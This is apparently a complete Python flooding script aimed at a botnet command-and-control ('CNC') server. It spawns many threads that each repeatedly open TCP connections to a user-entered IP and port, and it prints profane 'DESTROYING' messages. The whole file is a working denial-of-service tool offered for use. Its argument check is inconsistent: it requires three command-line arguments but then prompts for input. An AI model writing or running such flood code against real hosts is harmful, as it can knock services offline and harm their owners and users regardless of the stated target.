import socket, os, sys, threading, time, colorama
from colorama import Fore
 
if len(sys.argv) < 4:
    sys.exit("Usage: python "+sys.argv[0]+" <target ip of cnc> <connection port of cnc> <main threads(1-20)>")

ip = input("IP: ")
port = int(input("PORT: "))
wthreads = int(input("THREADS: "))
 
def worker():
    try:
        while True:
            try:
                lel = fl00d(ip)
                lel.start()
                time.sleep(0.001)
            except:
                pass
    except:
        pass
 
class fl00d(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = ip
    def run(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip,port))
            print(f"{Fore.RED}[!] DESTROYING THAT FUCKING CNC [!]" + Fore.RESET)
            time.sleep(6)
        except:
            print(f"{Fore.RED}[!] CNC FUCKING DESTROYED [!]" + Fore.RESET)
            pass
 
for g in range(wthreads):
    try:
        yeet = threading.Thread(target=worker)
        yeet.start()
        time.sleep(0.5)
    except:
        pass
